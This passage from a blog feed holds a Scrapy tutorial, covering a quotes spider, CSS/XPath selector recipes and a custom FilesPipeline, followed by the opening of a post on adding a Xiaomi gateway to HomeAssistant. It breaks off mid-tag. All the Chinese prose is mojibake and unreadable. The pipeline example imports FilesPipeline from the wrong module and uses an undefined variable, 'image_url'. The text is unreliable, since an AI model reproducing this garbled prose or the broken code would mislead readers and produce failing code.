çš„è§‚å¯Ÿï¼Œå¦‚ä¸‹å›¾ï¼š</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210203181417.png" alt="image-20210203181416969" style="zoom:50%;" /></p><p>å®¹æ˜“å‘ç°æ¯ä¸ªæ–¹æ¡†éƒ½æ˜¯ä¸€ä¸ª<code>class=&quot;quote&quot;</code> çš„<code>div</code>æ ‡ç­¾ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹çš„ä»£ç å»è§£æå…¶ä¸­çš„æ•°æ®ï¼ˆä»£ç è¿ç”¨äº†<code>css</code>è§£æï¼Œåé¢ä¼šè¯¦è§£ï¼Œè¿™é‡Œäº†è§£ä¸€ä¸‹å°±å¥½ï¼‰</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">class</span> <span class="token class-name">QuotesSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">"quotes"</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'http://quotes.toscrape.com/page/1/'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> quote <span class="token keyword">in</span> response<span class="token punctuation">.</span>css<span class="token punctuation">(</span><span class="token string">'div.quote'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">yield</span> <span class="token punctuation">&#123;</span>                <span class="token string">'text'</span><span class="token punctuation">:</span> quote<span class="token punctuation">.</span>css<span class="token punctuation">(</span><span class="token string">'span.text::text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">'author'</span><span class="token punctuation">:</span> quote<span class="token punctuation">.</span>css<span class="token punctuation">(</span><span class="token string">'small.author::text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">'tags'</span><span class="token punctuation">:</span> quote<span class="token punctuation">.</span>css<span class="token punctuation">(</span><span class="token string">'div.tags a.tag::text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>ä¸Šé¢çš„ä»£ç è®©æˆ‘ä»¬éå†æ‰€æœ‰<code>div</code>æ ‡ç­¾ï¼Œå¹¶ä»ä¸­æå–å‡ºä¸‰ä¸ªå­—æ®µçš„å†…å®¹ï¼Œè‡³æ­¤ï¼Œæˆ‘ä»¬çš„çˆ¬è™«è§£æéƒ¨åˆ†å°±å†™å¥½äº†</p></blockquote><ul><li>è¿è¡Œæˆ‘ä»¬çš„çˆ¬è™«å¾ˆå®¹æ˜“ï¼Œç›´æ¥æ‰§è¡Œä»£ç :<code>scrapy crawl quotes -o res.jl</code>å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æ•°æ®äº†</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210203182053.png" alt="image-20210203182053647" style="zoom:50%;" /></p><h2 id="scrapyè¿ä½œæœºåˆ¶"><a href="#scrapyè¿ä½œæœºåˆ¶" class="headerlink" title="scrapyè¿ä½œæœºåˆ¶"></a>scrapyè¿ä½œæœºåˆ¶</h2><p>pass</p><h2 id="scrapyé€‰æ‹©å™¨ï¼šcssä¸xpathä½¿ç”¨"><a href="#scrapyé€‰æ‹©å™¨ï¼šcssä¸xpathä½¿ç”¨" class="headerlink" title="scrapyé€‰æ‹©å™¨ï¼šcssä¸xpathä½¿ç”¨"></a>scrapyé€‰æ‹©å™¨ï¼šcssä¸xpathä½¿ç”¨</h2><blockquote><p>css&amp;xpathæ˜¯scrapyä¸­<code>response</code>è§£ææå–æ•°æ®çš„ä¸¤ç§ä¸»è¦æ–¹å¼ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œä½ ä¸€å®šç”¨è¿‡ä¾‹å¦‚<code>Beautifulsoup</code> è¿›è¡Œç½‘é¡µæ–‡æœ¬æ•°æ®çš„è§£æï¼Œç›¸æ¯”ä¹‹ä¸‹ï¼Œ<code>scrapy</code>å†…ç½®çš„è§£æå™¨æ•ˆç‡è¦æ›´é«˜ï¼Œå› æ­¤å¼ºçƒˆå»ºè®®å°†è¿™ä¸¤ç§è§£ææ–¹æ³•éƒ½æŒæ¡ã€‚ä¸‹é¢çš„åˆ—è¡¨ä¸ä¼šåƒå®˜ç½‘ä¸€æ ·ä¸€æ­¥æ­¥æ•™ä½ è§£æï¼Œæ›´å¤šçš„æ˜¯ä¸€ç§åŠŸèƒ½å¼çš„æŸ¥è¯¢ï¼Œå³å›ç­”<strong>æˆ‘è¯¥æ€ä¹ˆæ ·è·å–æˆ‘æƒ³è¦çš„æ•°æ®</strong>çš„é—®é¢˜ã€‚</p></blockquote><h3 id="æŸ¥æ‰¾æŒ‡å®šæ ‡ç­¾æ–‡æœ¬"><a href="#æŸ¥æ‰¾æŒ‡å®šæ ‡ç­¾æ–‡æœ¬" class="headerlink" title="æŸ¥æ‰¾æŒ‡å®šæ ‡ç­¾æ–‡æœ¬"></a>æŸ¥æ‰¾æŒ‡å®šæ ‡ç­¾æ–‡æœ¬</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.css(&#39;a::text&#39;)     response.xpath(&#39;&#x2F;&#x2F;a&#x2F;text()&#39;)   # æœ‰å¤šä¸ªæ ‡ç­¾è¿”å›å¤šä¸ª<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h3 id="æŸ¥æ‰¾æŒ‡å®šæ ‡ç­¾çš„å±æ€§"><a href="#æŸ¥æ‰¾æŒ‡å®šæ ‡ç­¾çš„å±æ€§" class="headerlink" title="æŸ¥æ‰¾æŒ‡å®šæ ‡ç­¾çš„å±æ€§"></a>æŸ¥æ‰¾æŒ‡å®šæ ‡ç­¾çš„å±æ€§</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.css(&#39;a::attr(href)&#39;)response.xpath(&#39;&#x2F;&#x2F;a&#x2F;@href&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h3 id="æŸ¥æ‰¾æŒ‡å®šå±æ€§ä¸ºæŒ‡å®šå€¼çš„æ ‡ç­¾"><a href="#æŸ¥æ‰¾æŒ‡å®šå±æ€§ä¸ºæŒ‡å®šå€¼çš„æ ‡ç­¾" class="headerlink" title="æŸ¥æ‰¾æŒ‡å®šå±æ€§ä¸ºæŒ‡å®šå€¼çš„æ ‡ç­¾"></a>æŸ¥æ‰¾æŒ‡å®šå±æ€§ä¸ºæŒ‡å®šå€¼çš„æ ‡ç­¾</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.css(&#39;a[href&#x3D;&quot;xxx&quot;]&#39;)   # è·å–å±æ€§href&#x3D;xxxçš„aæ ‡ç­¾response.xpath(&#39;&#x2F;&#x2F;a[@href&#x3D;&quot;xxx&quot;]&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h3 id="æŸ¥æ‰¾æŒ‡å®šå±æ€§åŒ…å«æŒ‡å®šå€¼çš„æ ‡ç­¾"><a href="#æŸ¥æ‰¾æŒ‡å®šå±æ€§åŒ…å«æŒ‡å®šå€¼çš„æ ‡ç­¾" class="headerlink" title="æŸ¥æ‰¾æŒ‡å®šå±æ€§åŒ…å«æŒ‡å®šå€¼çš„æ ‡ç­¾"></a>æŸ¥æ‰¾æŒ‡å®šå±æ€§åŒ…å«æŒ‡å®šå€¼çš„æ ‡ç­¾</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.css(&#39;a[href*&#x3D;&quot;xxx&quot;]&#39;)response.xpath(&#39;a[contains(@href, &quot;xxx&quot;)]&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h3 id="æŸ¥æ‰¾æ–‡æœ¬ä¸ºæŒ‡å®šå€¼çš„æ ‡ç­¾"><a href="#æŸ¥æ‰¾æ–‡æœ¬ä¸ºæŒ‡å®šå€¼çš„æ ‡ç­¾" class="headerlink" title="æŸ¥æ‰¾æ–‡æœ¬ä¸ºæŒ‡å®šå€¼çš„æ ‡ç­¾"></a>æŸ¥æ‰¾æ–‡æœ¬ä¸ºæŒ‡å®šå€¼çš„æ ‡ç­¾</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.xpath(&#39;&#x2F;&#x2F;a[text()&#x3D;&quot;xxx&quot;]&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><h3 id="æŸ¥æ‰¾æ–‡æœ¬åŒ…å«æŒ‡å®šå€¼çš„æ ‡ç­¾"><a href="#æŸ¥æ‰¾æ–‡æœ¬åŒ…å«æŒ‡å®šå€¼çš„æ ‡ç­¾" class="headerlink" title="æŸ¥æ‰¾æ–‡æœ¬åŒ…å«æŒ‡å®šå€¼çš„æ ‡ç­¾"></a>æŸ¥æ‰¾æ–‡æœ¬åŒ…å«æŒ‡å®šå€¼çš„æ ‡ç­¾</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.xpath(&#39;a[contains(text(), &quot;xxx&quot;)]&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>å½“è·å–åˆ°æ ‡ç­¾ä¹‹åï¼Œå¯ä»¥é€šè¿‡ <code>get()</code> , <code>getall()</code> ç­‰æ–¹æ³•æå–éœ€è¦çš„ä¿¡æ¯ï¼Œæˆ–è€…åœ¨æ­¤åŸºç¡€ä¸Šå†è¿›è¡Œæ ‡ç­¾çš„è·å–</p><h2 id="æ–‡ä»¶-amp-å›¾ç‰‡ä¸‹è½½"><a href="#æ–‡ä»¶-amp-å›¾ç‰‡ä¸‹è½½" class="headerlink" title="æ–‡ä»¶&amp;å›¾ç‰‡ä¸‹è½½"></a>æ–‡ä»¶&amp;å›¾ç‰‡ä¸‹è½½</h2><p>æœ‰äº›æ—¶å€™æˆ‘ä»¬å¸Œæœ›çˆ¬è™«ä¸ä»…çˆ¬å–æ–‡å­—ä¿¡æ¯ï¼Œä¹Ÿè¦ä¸‹è½½å›¾ç‰‡&amp;æ–‡ä»¶å†…å®¹åˆ°æœ¬åœ°ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°<code>scrapy.pipelines.FilesPipeline</code>å’Œ<code>scrapy.pipelines.ImagePipeline</code> äº†ï¼Œå®ƒä»¬åˆ†åˆ«å®šä¹‰äº†æ–‡ä»¶ç®¡é“å’Œå›¾ç‰‡ç®¡é“ã€‚ä¼ ç»Ÿçš„ä¸‹è½½æ–¹å¼æ˜¯åœ¨<code>parse</code> çš„æ—¶å€™åŠ å…¥ä¸‹è½½é“¾æ¥åˆ°<code>item</code>ä¸­ï¼Œç„¶åè°ƒç”¨ä¸‹è½½å‡½æ•°ï¼ˆå¦‚<code>cptools.process.download_file</code>ï¼‰æŒ‡å®šä¸‹è½½å¹¶å­˜å‚¨ï¼Œä½†è¿™ç§ä¸‹è½½æ–¹å¼æ˜¯é˜»å¡å¼çš„ï¼Œç”¨<code>pipeline</code>çš„å¥½å¤„æ˜¯å¯ä»¥å¼‚æ­¥ä¸‹è½½ï¼Œæé«˜æ•ˆç‡ï¼Œä¸»è¦çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å®šä¹‰ä¸€ä¸ª<code>Item</code>ï¼ˆå¯ä»¥æ˜¯åŸæœ¬å·²æœ‰çš„ï¼‰ï¼Œæ·»åŠ ä¸¤ä¸ªå­—æ®µ<code>files</code>,<code>file_urls</code>ï¼Œåè€…æ˜¯ä¸‹è½½é“¾æ¥çš„åˆ—è¡¨ï¼ˆå³ä¸€æ¬¡å¯ä¼ å…¥å¤šä¸ªä¸‹è½½é“¾æ¥ï¼‰ï¼Œå‰è€…æ˜¯æ–‡ä»¶ä¸‹è½½å®Œæˆåå­˜å‚¨çš„ä¸‹è½½ç›¸å…³ä¿¡æ¯ï¼ˆå¦‚ä¸‹è½½è·¯å¾„ã€urlã€æ ¡éªŒç ç­‰ï¼‰</li><li>åœ¨<code>settings.py</code> ä¸­è®¾ç½®å˜é‡<code>FILES_STORE</code>å³å­˜å‚¨è·¯å¾„ï¼Œä¹‹åä¸‹è½½çš„å†…å®¹éƒ½ä¼šå­˜å‚¨åœ¨è¿™ä¸ªè·¯å¾„ä¸‹ï¼Œæœ€ç»ˆç»“æœæ˜¯<code>FILES_STORE/full/3afec3b4765f8f0a07b78f98c07b83f013567a0a</code>(æœ€åä¸€ä¸²æ˜¯æ–‡ä»¶çš„sha1å€¼å‘½åçš„æ–‡ä»¶)</li><li>åœ¨<code>settings.py</code>ä¸­å¯åŠ¨<code>pipeline</code>ï¼šå³<code>scrapy.pipelines.files.FilesPipeline:1</code> </li></ol><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># items.py</span><span class="token keyword">class</span> <span class="token class-name">SFItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å›ºä»¶åç§°</span>    <span class="token comment"># ä¸‹è½½ä¿¡æ¯å­˜å‚¨ï¼Œä¸‹é¢å­—æ®µå¿…è¦</span>    file_urls <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    files <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># spiders</span><span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>item <span class="token operator">=</span> SFItem<span class="token punctuation">(</span><span class="token punctuation">)</span>    item<span class="token punctuation">[</span><span class="token string">'file_urls'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"https://download_url.zip"</span><span class="token punctuation">]</span>   <span class="token comment"># æ³¨æ„è¦åˆ—è¡¨ä¼ å…¥</span>    <span class="token keyword">yield</span> item    <span class="token comment"># settings.py</span>ITEM_PIPELINES <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'IndustryInfoCrawler.pipelines.SFFilesPipeline'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>   <span class="token string">'IndustryInfoCrawler.pipelines.MongoPipeline'</span><span class="token punctuation">:</span> <span class="token number">300</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>FILES_STORE <span class="token operator">=</span> <span class="token string">'root'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>ä¸Šé¢çš„æ–¹å¼åŸºæœ¬æ»¡è¶³äº†å¯¹æ–‡ä»¶çš„ä¸‹è½½æ“ä½œï¼Œä½†æœ‰ä¸¤ç‚¹é—®é¢˜ï¼š</p><ol><li><p>ä¸‹è½½è·¯å¾„æˆ‘ä»¬åªå®šä¹‰äº†æ ¹ç›®å½•ï¼Œå¦‚æœæˆ‘ä»¬ç›¸å¯¹æ–‡ä»¶åˆ†ç±»ï¼Œé‚£æ€ä¹ˆåŠ</p></li><li><p>æ–‡ä»¶åsha1å€¼æ˜¯ä¸ºäº†ä¸é‡å¤ï¼Œä½†å¯è¯»æ€§å¾ˆå·®ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿè‡ªå®šä¹‰æ–‡ä»¶å</p></li></ol></blockquote><p>è§£å†³åŠæ³•é€šè¿‡é‡å†™<code>Pipeline</code>å®ç°ï¼Œæ ·ä¾‹å¦‚ä¸‹ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scrapy<span class="token punctuation">.</span>pipelines<span class="token punctuation">.</span>images <span class="token keyword">import</span> FilesPipeline<span class="token keyword">class</span> <span class="token class-name">SFFilesPipeline</span><span class="token punctuation">(</span>FilesPipeline<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    è‡ªå®šä¹‰ä¸‹è½½ç®¡é“    """</span>    <span class="token keyword">def</span> <span class="token function">get_media_requests</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> item<span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> file_url <span class="token keyword">in</span> item<span class="token punctuation">[</span><span class="token string">'file_urls'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>image_url<span class="token punctuation">)</span>  <span class="token comment"># è¯·æ±‚ä¸‹è½½</span>    <span class="token keyword">def</span> <span class="token function">file_path</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> item<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment"># parent = super().file_path(request, response, info)  # è·å–çˆ¶ç±»ç›®å½•</span>        SF_path <span class="token operator">=</span>  <span class="token string">'SF'</span> <span class="token comment"># åœ¨è¿™é‡Œè‡ªå®šä¹‰å­˜å‚¨çš„ç›®å½•ï¼Œä¹Ÿå¯ä»¥æ ¹æ®ä¸åŒæ–‡ä»¶ç±»å‹ï¼Œè‡ªå·±è®¾ç½®åˆ†ç±»ç›®å½•</span>        filename <span class="token operator">=</span> <span class="token string">'test.zip'</span>        <span class="token keyword">return</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>SF_path<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>  <span class="token comment"># è¿”å›ç»“æœä¸ºæ–‡ä»¶å­˜å‚¨è·¯å¾„ï¼Œæœ€ç»ˆç»“æœæ˜¯åœ¨æ ¹ç›®å½•ä¸‹å­˜å‚¨`FILES_STORE/SF_PATH/filename`</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>æ–‡ä»¶åˆ°æœŸï¼šå¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¸å¸Œæœ›é‡å¤å¯¹æœ¬åœ°å·²æœ‰çš„æ–‡ä»¶è¿›è¡Œä¸‹è½½æ“ä½œï¼Œå¯ä»¥è‡ªå®šä¹‰ä¸‹è½½ç®¡é“ä¸­è¯·æ±‚çš„æ—¶å€™æ£€æŸ¥æœ¬åœ°æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®æ–‡ä»¶åˆ°æœŸæ—¶é—´ï¼ˆæœªåˆ°æœŸçš„æ–‡ä»¶ä¸ä¼šé‡å¤ä¸‹è½½ï¼‰</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># settings.py</span><span class="token comment"># 120 days of delay for files expiration</span>FILES_EXPIRES <span class="token operator">=</span> <span class="token number">120</span><span class="token comment"># 30 days of delay for images expiration</span>IMAGES_EXPIRES <span class="token operator">=</span> <span class="token number">30</span><span class="token comment"># å¦‚æœå­˜åœ¨è‡ªå®šä¹‰çš„æ–‡ä»¶ç®¡é“ï¼Œå¦‚ä¸Šé¢çš„SFFilesPipelineï¼Œå¯ä»¥å¯¹å•ä¸ªå­ç±»ç®¡é“è®¾ç½®åˆ°æœŸæ—¶é—´ï¼Œä»¥å­ç±»åç§°å¤§å†™å¼€å¤´</span>SFFILESPIPELINE_FILES_EXPIRES <span class="token operator">=</span> <span class="token number">120</span>   <span class="token comment"># 120å¤©å†…ä¸é‡å¤ä¸‹è½½é€šè¿‡SFFilesPipelineçš„æ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>è¿˜æœ‰ä¸€ä¸ªæ³¨æ„ç‚¹æ˜¯ï¼Œå½“ä¸‹è½½æ–‡ä»¶è¿‡å¤§ï¼Œè¶…å‡ºscrapyé¢„æœŸçš„è¯ï¼Œä¼šæŠ¥è­¦å‘Šï¼Œå¯ä»¥é€šè¿‡åœ¨<code>settings.py</code>ä¸­è®¾ç½®<code>DOWNLOAD_WARNSIZE = 0</code>å»é™¤</p></blockquote><ul><li><a href="https://blog.csdn.net/Zhihua_W/article/details/105200916">https://blog.csdn.net/Zhihua_W/article/details/105200916</a></li><li><a href="https://blog.csdn.net/weixin_43343144/article/details/87908448">https://blog.csdn.net/weixin_43343144/article/details/87908448</a></li><li><a href="https://scrapy-docs.readthedocs.io/zh/latest/topics/media-pipeline.html?highlight=%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6">https://scrapy-docs.readthedocs.io/zh/latest/topics/media-pipeline.html?highlight=%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>scrapy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€IoTæ™ºèƒ½å®¶å±…ã€‘ç±³å®¶ç½‘å…³æ¥å…¥HomeAssistant</title>
    <link href="/article/8460.html"/>
    <url>/article/8460.html</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰æ®µå®é™…éœ€è¦æ­å»ºä¸€ä¸ªæ™ºèƒ½å®¶å±…ç¯å¢ƒåœºæ™¯ä½¿ç”¨ï¼Œä¸ºäº†èƒ½å¤ŸåŒæ—¶æ¥å…¥å¤šä¸ªå‚å•†çš„è®¾å¤‡ï¼Œéœ€è¦ç”¨ä¸€ä¸ªå¼€æ”¾çš„IoTå¹³å°ï¼Œå¸¸è§çš„æœ‰</p><ul><li><code>IFTTT</code>ï¼šå…è®¸ä¸åŒå‚å•†å¹³å°çš„appæ¥å…¥ï¼Œåˆ›å»ºè§„åˆ™å®ç°æ™ºèƒ½æ“ä½œï¼Œä½†ä¸æ”¯æŒè®¸å¤šå›½äº§çš„å‚å•†ï¼Œå¦‚å°ç±³ã€åä¸ºã€‚</li><li><code>HomeAssistant</code>ï¼šç”¨<code>python</code>ç¼–å†™çš„ä¸€ä¸ªå¯ä»¥æœ¬åœ°åŒ–éƒ¨ç½²çš„å¼€æ”¾å¹³å°ï¼Œå…è®¸æ¥å…¥çš„å‚å•†å’Œè®¾å¤‡ç±»å‹éå¸¸å¤šï¼Œå…¶ä¸­å°±åŒ…å«<code>å°ç±³</code>ã€‚</li><li><code>OpenHAB</code>:ä¸<code>HomeAssistant</code>ç±»ä¼¼ï¼Œå±äºå›½å¤–çš„å¼€æ”¾å¹³å°ã€‚</li></ul><p>ç”±äºæœ¬äººå¤„äºå›½å†…ï¼Œç»è¿‡æ–Ÿé…Œåˆ†æï¼Œ<code>HomeAssistant</code>çš„å¯å®ç°æ€§æœ€å¤§ï¼Œèµ„æ–™ä¹Ÿæœ€å…¨ã€‚ä½†æ˜¯åœ¨è´­ä¹°ç±³å®¶çš„è®¾å¤‡æ¥å…¥<code>HA</code>çš„æ—¶å€™å´å‡ºç°äº†é—®é¢˜ã€‚æœ¬äººåœ¨æœé›†å„ç±»èµ„æ–™å’Œå®è·µçš„è¿‡ç¨‹ä¸­ä¹Ÿè¸©äº†å¾ˆå¤šå‘ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œå› æ­¤æ’°å†™è¯¥æ–‡ï¼Œå¸Œæœ›å¸®åŠ©å…¶ä»–äººå¿«é€Ÿè§£å†³ç±³å®¶ç½‘å…³æ¥å…¥HAçš„é—®é¢˜ã€‚</p><blockquote><p>æœ¬æ–‡ä¸»è¦è§£å†³å®é™…æ“ä½œè¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼Œæ›´æ–°æ—¶é—´ä¸º<code>20/07/14</code>ã€‚å…·ä½“æ€ä¹ˆå®‰è£…<code>HA</code>ï¼Œç½‘ä¸Šå·²æœ‰è®¸å¤šæ•™ç¨‹ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°ã€‚</p></blockquote><h1 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h1><p>å…ˆæä¾›ä¸€ä¸ªè¾ƒä¸ºå®˜æ–¹çš„<a href="https://home-assistant.cc/component/xiaomi/zigbee/">ä¸­æ–‡æ–‡æ¡£</a>ï¼Œè®¸å¤šæ“ä½œå¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚</p><h2 id="ç½‘å…³å±€åŸŸç½‘é€šä¿¡åè®®çš„è·å–"><a href="#ç½‘å…³å±€åŸŸç½‘é€šä¿¡åè®®çš„è·å–" class="headerlink" title="ç½‘å…³å±€åŸŸç½‘é€šä¿¡åè®®çš„è·å–"></a>ç½‘å…³å±€åŸŸç½‘é€šä¿¡åè®®çš„è·å–</h2><p>å½“ä½ æœç´¢ç±³å®¶ç½‘å…³æ¥å…¥<code>HomeAssistant</code>æ—¶ï¼Œç°åœ¨ç½‘ä¸Šæœ‰çš„æ–¹æ¡ˆåŒ…æ‹¬å®˜æ–¹æ–‡æ¡£ã€ä¸ªäººåšå®¢ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹ï¼š</p><ul><li><a href="https://www.jiaheu.com/topic/258031.html">å°ç±³è€å¤šåŠŸèƒ½ç½‘å…³æ¥å…¥HA</a>:è¿™ç§æ–‡ç« æœ€å¤šï¼Œä¸”å¹´ä»£æ¯”è¾ƒä¹…è¿œï¼Œä¸€èˆ¬æ˜¯17ï¼Œ18å¹´çš„ã€‚é™åˆ¶è¦æ±‚æ˜¯ç±³å®¶ç½‘å…³å¿…é¡»æ˜¯è€ç‰ˆçš„å¤šåŠŸèƒ½ç½‘å…³(éç°å”®çš„æ™ºèƒ½å¤šæ¨¡ç½‘å…³)ï¼Œä¸Šé¢æœ‰å¾ˆå¤šå­”çš„ï¼Œä¸”å¯¹ç±³å®¶appçš„è¦æ±‚æ˜¯è€ç‰ˆæœ¬<code>5.0.19</code>ä»¥å‰ã€‚å¦‚æœä½ æ‰‹ä¸Šæ˜¯<a href="https://item.jd.com/100010622778.html">å¤šæ¨¡æ™ºèƒ½ç½‘å…³</a>ï¼Œå°±é€€è´§å§</li></ul><h2 id="ä¿®æ”¹configuration-yamlæ·»åŠ è®¾å¤‡"><a href="#ä¿®æ”¹configuration-yamlæ·»åŠ è®¾å¤‡" class="headerlink" title="ä¿®æ”¹configuration.yamlæ·»åŠ è®¾å¤‡"></a>ä¿®æ”¹<code>configuration.yaml</code>æ·»åŠ è®¾å¤‡</h2><p>æœç´¢åˆ°çš„èµ„æ–™å¤§å¤šä»¥ä¿®æ”¹<code>configuration.yaml</code>æ–‡ä»¶çš„æ–¹å¼æ¥æ·»åŠ è®¾å¤‡ï¼Œç±»ä¼¼ä¸‹é¢ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">xiaomi_aqara:  gateways:    #æ­¤å¤„å¡«å†™Aqaraç©ºè°ƒä¼´ä¾£çš„macåœ°å€ï¼Œå»æ‰ä¸­é—´çš„ï¼š    - mac: 7E49EAB4EC68    #æ­¤å¤„å¡«å†™ç¬¬äºŒæ­¥è·å¾—çš„key      key: ***************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>å®é™…ä¸Šå¯ä»¥é€šè¿‡<code>HA</code>æ§åˆ¶é¢æ¿ç›´æ¥æ·»åŠ ã€‚å…·ä½“æ­¥éª¤åŒ…å«ï¼š</p><blockquote><p>å‰ææ˜¯ä½ çš„ç½‘å…³è®¾å¤‡å·²ç»å¼€å¯ï¼Œè¯·åœ¨ç±³å®¶appä¸­ç¡®ä¿èƒ½è¿æ¥ä¸Šã€‚</p></blockquote><ul><li>æŒ‰ç…§ä¸‹å›¾é€‰é¡¹æ·»åŠ è®¾å¤‡<br>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114700.png" alt="image-20210328114700842" style="zoom:33%;" /></li><li>åœ¨æœç´¢æ ä¸­æœç´¢xiaomiï¼Œé€‰æ‹©ç½‘å…³<br>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114719.png" alt="image-20210328114719287" style="zoom: 